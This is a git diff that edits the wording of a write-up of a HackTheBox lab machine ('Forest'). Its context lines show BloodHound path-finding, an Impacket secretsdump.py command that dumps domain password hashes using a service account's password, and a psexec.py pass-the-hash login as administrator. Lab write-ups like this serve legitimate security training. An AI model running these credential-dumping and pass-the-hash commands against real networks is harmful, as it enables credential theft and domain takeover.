@@ -373,8 +373,7 @@ CODE_OF_CONDUCT.md             evil-winrm.rb    LICENSE
 ```
 
 #### 3. Data import to Bloodhound
-You can just drag/drop the zip file you downloaded or 'Upload data' menu on the right side of BloodHound.<br>
-Or you can use 'Upload Data' on the right side menu.
+You can just drag/drop the zip file you downloaded or use 'Upload data' menu on the right side of BloodHound.
 
 #### 4. Find a shortest way to Admin Users
 Click 'Pathfinding' of the top menu. We can Look for a shortest way from 'SVC-ALFRESCO' to 'DOMAIN ADMINS'.
@@ -459,7 +458,6 @@ root@kali:~#
 ```
 
 After that, we can use `secretdump.py` in `Impacket` to dump the password hash for `administrator`.<br>
-We found the password hash of `Administrator`.
 ```shell
 root@kali:~# /usr/local/bin/secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
@@ -565,7 +563,7 @@ EXCH01$:des-cbc-md5:8c45f44c16975129
 root@kali:~# 
 ```
 
-The domain admin hash can be used to login using `psexec.py`.<br>
+The domain admin hash can be used for login using `psexec.py`.<br>
 `root.txt` is in the directory `C:\Users\Administrator\Desktop\root.txt`.
 ```shell
 root@kali:~# /usr/local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 'htb/administrator@10.10.10.161' cmd
